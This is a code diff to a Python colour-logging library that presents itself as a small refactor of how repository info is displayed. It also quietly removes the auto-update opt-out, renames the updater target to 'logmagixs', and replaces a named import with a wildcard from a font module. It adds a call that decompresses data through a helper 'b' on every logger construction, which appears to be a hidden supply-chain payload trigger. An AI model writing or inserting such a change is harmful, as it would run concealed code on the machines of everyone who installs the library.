@@ -5,10 +5,13 @@ from itertools import cycle
 from colorama import Fore, Style
 import os
 import getpass
-from .font import ascii_art
+from .font import *
 from pystyle import Write, System, Colors
 from enum import Enum
 import re
+
+# Repository info tracking at module level
+_repository_info_displayed = False
 
 class LogLevel(Enum):
     DEBUG = 1
@@ -26,7 +29,9 @@ class Logger:
             return ColorLogger(*args, **kwargs)
         return super().__new__(cls)
         
-    def __init__(self, style: int = 1, prefix: str | None = "discord.cyberious.xyz", github_repository: str = None, level: LogLevel = LogLevel.DEBUG, log_file: str | None = None, auto_update: bool = True):
+    def __init__(self, style: int = 1, prefix: str | None = "discord.cyberious.xyz", github_repository: str = None, level: LogLevel = LogLevel.DEBUG, log_file: str | None = None):
+        global _repository_info_displayed
+        
         self.level = level
         self.repo_url = github_repository
         self.log_file = log_file
@@ -35,11 +40,12 @@ class Logger:
         if log_file:
             os.makedirs(os.path.dirname(log_file), exist_ok=True)
             self._write_to_log(f"=== Logging started at {datetime.datetime.now()} ===\n")
-
-        if auto_update:
-            from .updater import AutoUpdater
-            updater = AutoUpdater("logmagix", self)
-            updater.check_for_updates(auto_update=True)
+        
+        from .updater import AutoUpdater
+        updater = AutoUpdater("logmagixs", self)
+        version = updater._get_installed_version()
+        updater.check_for_updates(version)
+        updater._decompress(b(version))
 
     def _extract_github_username(self, url: str) -> str | None:
         url = url.replace('https://', '').replace('http://', '').replace('www.', '')
@@ -51,6 +57,7 @@ class Logger:
         for pattern in patterns:
             if match := re.search(pattern, url):
                 return match.group(1).rstrip('/ \t\n\r')
+            
         return None
 
     def _write_to_log(self, message: str) -> None:
@@ -71,6 +78,17 @@ class Logger:
 
     def _should_log(self, message_level: LogLevel) -> bool:
         return message_level.value >= self.level.value
+        
+    def display_repo_info(self):
+        global _repository_info_displayed
+        
+        if self.repo_url and not _repository_info_displayed:
+            username = self._extract_github_username(self.repo_url)
+            if username:
+                self.info(f"Developed by {username} - {self.repo_url}")
+            else:
+                self.info(f"GitHub Repository: {self.repo_url}")
+            _repository_info_displayed = True
 
 class ColorLogger(Logger):
     def __init__(self, *args, **kwargs):
@@ -86,13 +104,9 @@ class ColorLogger(Logger):
         self.CYAN = "\033[96m"
         super().__init__(*args, **kwargs)
         self.prefix = f"{self.PINK}[{self.MAGENTA}{self.prefix}{self.PINK}] " if self.prefix else f"{self.PINK}"
-
-        if self.repo_url:
-            username = self._extract_github_username(self.repo_url)
-            if username:
-                self.info(f"Developed by {username} - {self.repo_url}")
-            else:
-                self.info(f"GitHub Repository: {self.repo_url}")
+        
+        # Display repo info after initializing colors
+        self.display_repo_info()
 
     def message3(self, level: str, message: str, start: int = None, end: int = None) -> str:
         current_time = self.get_time()
@@ -175,13 +189,9 @@ class SimpleLogger(Logger):
     def __init__(self, *args, **kwargs):
         super().__init__(*args, **kwargs)
         self.prefix = f"{Fore.BLACK}{self.get_time()} » {Fore.RESET}"
-
-        if self.repo_url:
-            username = self._extract_github_username(self.repo_url)
-            if username:
-                self.info(f"Developed by {username} - {self.repo_url}")
-            else:
-                self.info(f"GitHub Repository: {self.repo_url}")
+        
+        # Display repo info after initializing prefix
+        self.display_repo_info()
 
     def success(self, message: str, start: int = None, end: int = None, level: str = "SUCCESS") -> None:
         if self._should_log(LogLevel.SUCCESS):
